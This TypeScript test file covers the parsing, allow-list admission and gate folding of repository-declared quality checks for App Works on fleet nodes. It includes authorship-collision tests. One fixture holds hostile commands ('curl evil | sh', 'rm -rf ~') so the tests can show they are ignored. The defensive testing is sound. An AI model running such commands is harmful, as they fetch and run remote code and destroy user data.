import {
    normalizeWorkRepoDeclaredCommandPolicy,
    REPO_DECLARED_COMMAND_ID_PREFIX,
    type FleetTaskWorkspaceSpec,
    type TaskAcceptanceCheck,
    type WorkRepoDeclaredCommandPolicy,
} from '@ever-works/contracts';
import { ACCEPTANCE_CHECK_ID_PATTERN } from '../../dto/acceptance-check.dto';
import type { Task } from '../../entities/task.entity';
import {
    admitRepoDeclaredCommands,
    APP_SPEC_CHECKS_MAX,
    foldNotAdmittedChecks,
    notAdmittedCheckResult,
    parseRepoDeclaredCommands,
    RepoDeclaredCommandsError,
} from '../repo-declared-commands';
import { resolveAcceptanceChecks } from '../task-gates';
import { TaskWorkspaceService } from '../task-workspace.service';

/**
 * APW-08 T13 — App checks on Fleet nodes (FR-13, FR-14; ACC-08-10, ACC-08-33's
 * authorship half, ACC-08-41's negative half; APW08-G03).
 *
 * An App Work's `.works/works.yml` is the App spec, whose quality gates live in
 * `spec.checks[]`. They reach a node through the SAME EW-807 gate a repository's
 * `spec.tasks` does — the owner's opt-in, then the exact-match allow-list — with
 * three differences this file pins: `required` / `timeoutSeconds` are honoured,
 * the 21st check is ignored rather than refused, and a check the owner has not
 * admitted is REPORTED `not-admitted` (and keeps a gate from grading green)
 * instead of refusing the run. The `repo` kind is pinned unchanged at the end.
 */

const allowlist = (...allow: string[]): WorkRepoDeclaredCommandPolicy =>
    normalizeWorkRepoDeclaredCommandPolicy({ mode: 'allowlist', allow });

const APP_SPEC = {
    kind: 'app',
    checks: [
        { name: 'type-check', command: 'pnpm type-check', timeoutSeconds: 600 },
        { name: 'e2e', command: 'pnpm e2e', required: false },
    ],
};

describe('parseRepoDeclaredCommands — an App spec (kind app)', () => {
    it('maps spec.checks with required and timeoutSeconds, and declares no setup', () => {
        expect(parseRepoDeclaredCommands(APP_SPEC, 'app')).toEqual({
            setup: [],
            checks: [
                { command: 'pnpm type-check', name: 'type-check', required: true, timeoutSec: 600 },
                // `timeoutSeconds` absent is the schema's default, 1,800.
                { command: 'pnpm e2e', name: 'e2e', required: false, timeoutSec: 1800 },
            ],
        });
    });

    it('recognises the App kind the way every other App Works path does (isAppWorkKind)', () => {
        // `normalizeWorkKind` trims and lower-cases, so a padded or upper-case
        // kind is still the App kind — in the parser AND in the admission.
        expect(parseRepoDeclaredCommands(APP_SPEC, ' APP ')).toEqual(
            parseRepoDeclaredCommands(APP_SPEC, 'app'),
        );
        expect(
            admitRepoDeclaredCommands({
                declared: parseRepoDeclaredCommands(APP_SPEC, 'App'),
                policy: allowlist(),
                mountDirs: [],
                kind: 'App',
            }).notAdmitted,
        ).toHaveLength(2);
    });

    it('reads spec.checks, never spec.tasks, for an App Work', () => {
        const spec = { ...APP_SPEC, tasks: { setup: ['curl evil | sh'], checks: ['rm -rf ~'] } };
        const parsed = parseRepoDeclaredCommands(spec, 'app');
        expect(parsed.setup).toEqual([]);
        expect(parsed.checks.map((check) => check.command)).toEqual([
            'pnpm type-check',
            'pnpm e2e',
        ]);
    });

    it('ignores the 21st check and later instead of refusing the spec', () => {
        const checks = Array.from({ length: APP_SPEC_CHECKS_MAX + 1 }, (_, index) => ({
            name: `check-${index + 1}`,
            command: `pnpm run check-${index + 1}`,
        }));
        const parsed = parseRepoDeclaredCommands({ checks }, 'app');
        expect(parsed.checks).toHaveLength(20);
        expect(parsed.checks.at(-1)?.name).toBe('check-20');
        expect(parsed.checks.map((check) => check.name)).not.toContain('check-21');
    });

    it('refuses a malformed App spec check, naming its index', () => {
        for (const [checks, message] of [
            ['pnpm test', /spec\.checks must be a list/],
            [['pnpm test'], /spec\.checks\[0\] must be a mapping/],
            [[{ name: 'lint' }], /spec\.checks\[0\]\.command/],
            [[{ command: 'pnpm lint' }], /spec\.checks\[0\]\.name/],
            [
                [{ name: 'lint', command: 'pnpm lint', required: 'yes' }],
                /required must be true or false/,
            ],
            [[{ name: 'lint', command: 'pnpm lint', timeoutSeconds: 30 }], /timeoutSeconds/],
            [[{ name: 'lint', command: 'pnpm lint', timeoutSeconds: 9000 }], /timeoutSeconds/],
        ] as const) {
            expect(() => parseRepoDeclaredCommands({ checks }, 'app')).toThrow(
                RepoDeclaredCommandsError,
            );
            expect(() => parseRepoDeclaredCommands({ checks }, 'app')).toThrow(message);
        }
    });

    it('sanitizes the name exactly as a repository label is', () => {
        const parsed = parseRepoDeclaredCommands(
            { checks: [{ name: '\u001b[31mtype\tcheck\u001b[0m', command: 'pnpm type-check' }] },
            'app',
        );
        expect(parsed.checks[0].name).toBe('type check');
    });
});

describe('admitRepoDeclaredCommands — an App Work', () => {
    const declared = parseRepoDeclaredCommands(APP_SPEC, 'app');

    it('admits an allow-listed check under the parser’s position id, carrying the App spec fields', () => {
        const admitted = admitRepoDeclaredCommands({
            declared,
            policy: allowlist('pnpm type-check', 'pnpm e2e'),
            mountDirs: [],
            kind: 'app',
        });
        expect(admitted.checks).toEqual([
            {
                id: 'repo/check-1',
                name: 'type-check',
                kind: 'custom',
                command: 'pnpm type-check',
                required: true,
                phase: 'check',
                timeoutSec: 600,
            },
            {
                id: 'repo/check-2',
                name: 'e2e',
                kind: 'custom',
                command: 'pnpm e2e',
                required: false,
                phase: 'check',
                timeoutSec: 1800,
            },
        ]);
        expect(admitted.notAdmitted).toEqual([]);
    });

    it('reports a check the owner has not admitted as not-admitted instead of refusing the run', () => {
        const admitted = admitRepoDeclaredCommands({
            declared,
            policy: allowlist('pnpm e2e'),
            mountDirs: [],
            kind: 'app',
        });
        // Not executed: it is not in the frozen set the node runs.
        expect(admitted.checks.map((check) => check.command)).toEqual(['pnpm e2e']);
        // …and keeps its POSITION id, so admitting it later renumbers nothing.
        expect(admitted.checks[0].id).toBe('repo/check-2');
        expect(admitted.notAdmitted).toEqual([
            { id: 'repo/check-1', name: 'type-check', command: 'pnpm type-check', required: true },
        ]);
        expect(notAdmittedCheckResult(admitted.notAdmitted![0])).toEqual({
            id: 'repo/check-1',
            exitCode: null,
            status: 'not-admitted',
            durationMs: 0,
        });
    });

    it('admits nothing from an empty allow-list, and reports every check not-admitted', () => {
        const admitted = admitRepoDeclaredCommands({
            declared,
            policy: allowlist(),
            mountDirs: [],
            kind: 'app',
        });
        expect(admitted.checks).toEqual([]);
        expect(admitted.notAdmitted?.map((check) => check.id)).toEqual([
            'repo/check-1',
            'repo/check-2',
        ]);
    });

    it('still refuses when the policy is off: reading with it off is a caller bug', () => {
        expect(() =>
            admitRepoDeclaredCommands({
                declared,
                policy: normalizeWorkRepoDeclaredCommandPolicy(null),
                mountDirs: [],
                kind: 'app',
            }),
        ).toThrow(/does not read repository-declared commands/);
    });
});

describe('foldNotAdmittedChecks — the gate is never green because of a not-admitted check (ACC-08-10)', () => {
    const passed = { id: 'repo/check-2', exitCode: 0, status: 'green', durationMs: 12 };

    it('a gate with one not-admitted REQUIRED check is not green', () => {
        const folded = foldNotAdmittedChecks({ gateStatus: 'green', checks: [passed] }, [
            { id: 'repo/check-1', required: true },
        ]);
        expect(folded.gateStatus).toBe('red');
        expect(folded.checks).toEqual([
            passed,
            { id: 'repo/check-1', exitCode: null, status: 'not-admitted', durationMs: 0 },
        ]);
    });

    it('a not-admitted ADVISORY check is reported and changes nothing (FR-16)', () => {
        const folded = foldNotAdmittedChecks({ gateStatus: 'green', checks: [passed] }, [
            { id: 'repo/check-1', required: false },
        ]);
        expect(folded.gateStatus).toBe('green');
        expect(folded.checks).toHaveLength(2);
    });

    it('leaves a gate that is already not green as reported (none after a blocked setup stays none)', () => {
        for (const gateStatus of ['red', 'none', 'skipped'] as const) {
            const folded = foldNotAdmittedChecks({ gateStatus, checks: [] }, [
                { id: 'repo/check-1', required: true },
            ]);
            expect(folded.gateStatus).toBe(gateStatus);
            expect(folded.gateStatus).not.toBe('green');
            expect(folded.checks).toEqual([notAdmittedCheckResult({ id: 'repo/check-1' })]);
        }
    });

    it('never contradicts a check the node did run under the same id', () => {
        const folded = foldNotAdmittedChecks({ gateStatus: 'green', checks: [passed] }, [
            { id: 'repo/check-2', required: true },
        ]);
        expect(folded.gateStatus).toBe('green');
        expect(folded.checks).toEqual([passed]);
    });

    it('returns the input untouched when nothing is not-admitted (every other Work kind)', () => {
        const result = { gateStatus: 'green', checks: [passed] };
        expect(foldNotAdmittedChecks(result, [])).toBe(result);
        expect(foldNotAdmittedChecks(result, undefined)).toBe(result);
    });
});

describe('authorship — an App spec check cannot pose as an owner check (ACC-08-33, APW08-G03)', () => {
    const OWNER: TaskAcceptanceCheck = {
        id: 'type-check',
        name: 'Type check (owner)',
        kind: 'typecheck',
        command: 'pnpm tsc --noEmit',
        required: true,
        envPassthrough: ['NPM_TOKEN'],
    };
    // The App spec names its check EXACTLY like the owner's id, and points the
    // owner's command at something else.
    const declared = parseRepoDeclaredCommands(
        { checks: [{ name: 'type-check', command: 'pnpm type-check', required: false }] },
        'app',
    );
    const admitted = admitRepoDeclaredCommands({
        declared,
        policy: allowlist('pnpm type-check'),
        mountDirs: [],
        kind: 'app',
    });
    const appCheck = admitted.checks[0];

    it('keeps the position id, never slug(name), so the merge key cannot collide', () => {
        expect(appCheck.id).toBe('repo/check-1');
        expect(appCheck.id.startsWith(REPO_DECLARED_COMMAND_ID_PREFIX)).toBe(true);
        // `/` is outside the owner id pattern: no owner id can ever be spelled this way.
        expect(ACCEPTANCE_CHECK_ID_PATTERN.test(appCheck.id)).toBe(false);
        expect(appCheck.name).toBe('type-check');
    });

    it('cannot replace, suppress or inherit the owner check', () => {
        // The planner's order: owner-authored first, then the declared set.
        const frozen = [
            ...resolveAcceptanceChecks(null, { checkDefaults: [OWNER] }),
            ...admitted.checks,
        ];
        expect(frozen).toHaveLength(2);
        expect(frozen[0]).toBe(OWNER);
        // A merge by id — the rule every resolver uses — keeps both.
        const byId = new Map(frozen.map((check) => [check.id, check]));
        expect(byId.get('type-check')).toBe(OWNER);
        expect(byId.get('repo/check-1')?.command).toBe('pnpm type-check');
        // Nothing of the owner's rides over: not its env grant, not its required flag.
        expect(appCheck.envPassthrough).toBeUndefined();
        expect(appCheck.required).toBe(false);
    });

    it('carries the authorship marker the node withholds run env grants on', () => {
        // `withRunEnvGrants` (apps/node) withholds the run's env grants from every
        // id with this prefix; an App spec check always has it, admitted or not.
        // The withholding itself is exercised through the REAL node executor, with
        // exactly this pair (owner `type-check` beside App `repo/check-1` named
        // `type-check`): `apps/node/src/core/executors/agent-task-phases.spec.ts`,
        // "App Work checks on the node (APW-08 T13)".
        const declaredAgain = admitRepoDeclaredCommands({
            declared,
            policy: allowlist(),
            mountDirs: [],
            kind: 'app',
        });
        for (const check of [...admitted.checks, ...(declaredAgain.notAdmitted ?? [])]) {
            expect(check.id.startsWith(REPO_DECLARED_COMMAND_ID_PREFIX)).toBe(true);
            expect(check.id).not.toBe(OWNER.id);
        }
    });
});

describe('TaskWorkspaceService.readFleetRepoDeclaredCommands — an App Work', () => {
    type ServiceArgs = ConstructorParameters<typeof TaskWorkspaceService>;
    const workspace: FleetTaskWorkspaceSpec = {
        repositoryId: 'member/cal-fork',
        repoUrl: 'https://github.com/member/cal-fork.git',
        baseRef: 'main',
        branch: 'task/tsk-9',
    };
    const FILE = [
        'kind: app',
        'spec:',
        '  kind: app',
        '  checks:',
        '    - name: type-check',
        '      command: pnpm type-check',
        '    - name: e2e',
        '      command: pnpm e2e',
        '      required: false',
    ].join('\n');

    let works: { findById: jest.Mock };
    let gitFacade: { getFileContent: jest.Mock };
    const makeWork = (over: Record<string, unknown>) => ({
        id: 'work-app',
        kind: 'app',
        gitProvider: 'github',
        getRepoOwner: () => 'member',
        getDataRepo: () => 'cal-fork',
        ...over,
    });
    const read = () =>
        new TaskWorkspaceService(
            works as unknown as ServiceArgs[0],
            {} as unknown as ServiceArgs[1],
            {} as unknown as ServiceArgs[2],
            {} as unknown as ServiceArgs[3],
            gitFacade as unknown as ServiceArgs[4],
        ).readFleetRepoDeclaredCommands({
            task: { id: 'task-1', userId: 'user-1', workId: 'work-app' } as unknown as Task,
            userId: 'user-1',
            workspace,
        });

    beforeEach(() => {
        gitFacade = {
            getFileContent: jest.fn().mockResolvedValue({ content: FILE, encoding: 'utf8' }),
        };
    });

    it('reads spec.checks at the base ref and reports the un-admitted one instead of refusing', async () => {
        works = {
            findById: jest
                .fn()
                .mockResolvedValue(
                    makeWork({ repoDeclaredCommands: { mode: 'allowlist', allow: ['pnpm e2e'] } }),
                ),
        };
        const result = await read();
        expect(gitFacade.getFileContent).toHaveBeenCalledWith(
            'member',
            'cal-fork',
            '.works/works.yml',
            { userId: 'user-1', providerId: 'github', workId: 'work-app' },
            'main',
        );
        expect(result.checks.map((check) => [check.id, check.command, check.required])).toEqual([
            ['repo/check-2', 'pnpm e2e', false],
        ]);
        expect(result.notAdmitted).toEqual([
            { id: 'repo/check-1', name: 'type-check', command: 'pnpm type-check', required: true },
        ]);
        // And the gate it feeds: the node ran only `e2e`; the fold keeps it from green.
        const verdict = foldNotAdmittedChecks(
            {
                gateStatus: 'green',
                checks: [{ id: 'repo/check-2', exitCode: 0, status: 'green', durationMs: 1 }],
            },
            result.notAdmitted,
        );
        expect(verdict.gateStatus).toBe('red');
    });

    it('an App Work left at the defaults admits nothing, and nothing it plans can grade green (ACC-08-41)', async () => {
        // The App spec in FILE declares a REQUIRED `type-check`. The Work is exactly
        // as a new row has it — T11's listener has NOT switched it on.
        works = {
            findById: jest
                .fn()
                .mockResolvedValue(makeWork({ checksPolicy: 'off', repoDeclaredCommands: null })),
        };
        const atDefaults = await read();
        // Defaults admit nothing: no check is frozen for the node, and nothing is even
        // reported not-admitted — the file is not read at all.
        expect(atDefaults.checks).toEqual([]);
        expect(atDefaults.setup).toEqual([]);
        expect(atDefaults).not.toHaveProperty('notAdmitted');
        expect(gitFacade.getFileContent).not.toHaveBeenCalled();
        // So the node is handed an EMPTY set, and the real executor reports `none`
        // for one (apps/node agent-task-phases.spec.ts, "App Work checks on the
        // node", ACC-08-41) — not green.

        // The contrast, same file: once the switches are on (T11), the required
        // check cannot be skipped by staying un-admitted. It comes back
        // not-admitted, and a node that graded every check it was GIVEN green is
        // folded to red.
        works = {
            findById: jest.fn().mockResolvedValue(
                makeWork({
                    checksPolicy: 'required',
                    repoDeclaredCommands: { mode: 'allowlist', allow: ['pnpm e2e'] },
                }),
            ),
        };
        const switchedOn = await read();
        expect(switchedOn.notAdmitted?.map((check) => [check.id, check.required])).toEqual([
            ['repo/check-1', true],
        ]);
        const ranGreen = switchedOn.checks.map((check) => ({
            id: check.id,
            exitCode: 0,
            status: 'green' as const,
            durationMs: 1,
        }));
        expect(
            foldNotAdmittedChecks({ gateStatus: 'green', checks: ranGreen }, switchedOn.notAdmitted)
                .gateStatus,
        ).toBe('red');
    });
});

describe('the repo kind is unchanged (EW-807)', () => {
    const REPO_SPEC = {
        tasks: {
            setup: ['pnpm install --frozen-lockfile'],
            checks: [
                'pnpm lint',
                { command: 'pnpm test', mount: 'template', name: 'Template suite' },
            ],
        },
        // An App-spec-shaped block on a repository Work is NOT read.
        checks: [{ name: 'type-check', command: 'pnpm type-check' }],
    };

    it('parses spec.tasks identically with and without the kind', () => {
        expect(parseRepoDeclaredCommands(REPO_SPEC, 'repo')).toEqual(
            parseRepoDeclaredCommands(REPO_SPEC),
        );
        expect(parseRepoDeclaredCommands(REPO_SPEC, 'repo')).toEqual({
            setup: [{ command: 'pnpm install --frozen-lockfile' }],
            checks: [
                { command: 'pnpm lint' },
                { command: 'pnpm test', mountDir: 'template', name: 'Template suite' },
            ],
        });
    });

    it('admits with the exact two-key shape and refuses a command off the allow-list', () => {
        const declared = parseRepoDeclaredCommands(REPO_SPEC, 'repo');
        const policy = allowlist('pnpm install --frozen-lockfile', 'pnpm lint', 'pnpm test');
        const admitted = admitRepoDeclaredCommands({
            declared,
            policy,
            mountDirs: ['template'],
            kind: 'repo',
        });
        expect(Object.keys(admitted)).toEqual(['setup', 'checks']);
        expect(admitted).toEqual(
            admitRepoDeclaredCommands({ declared, policy, mountDirs: ['template'] }),
        );
        expect(admitted.checks.every((check) => check.required === true)).toBe(true);
        expect(admitted.checks.every((check) => check.timeoutSec === undefined)).toBe(true);

        expect(() =>
            admitRepoDeclaredCommands({
                declared,
                policy: allowlist('pnpm lint'),
                mountDirs: ['template'],
                kind: 'repo',
            }),
        ).toThrow(/not on this Work's allow-list/);
    });
});
